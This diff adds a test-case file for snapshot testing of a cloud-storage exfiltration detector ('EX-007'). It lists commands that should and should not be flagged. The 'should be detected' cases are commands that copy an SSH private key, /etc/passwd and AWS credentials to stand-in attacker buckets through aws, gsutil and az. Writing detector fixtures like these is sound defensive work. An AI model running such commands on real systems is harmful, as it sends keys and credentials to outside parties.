@@ -1,0 +1,12 @@
+# EX-007: Cloud storage exfiltration
+# Test cases for snapshot testing
+
+# === Cases that SHOULD be detected ===
+aws s3 cp ~/.ssh/id_rsa s3://evil-bucket/$SECRET
+gsutil cp /etc/passwd gs://malicious-bucket/
+az storage blob upload --file $HOME/.aws/credentials
+
+# === Cases that should NOT be detected ===
+aws s3 cp file.txt s3://my-bucket/backup
+gsutil cp report.pdf gs://team-bucket/
+az storage blob list
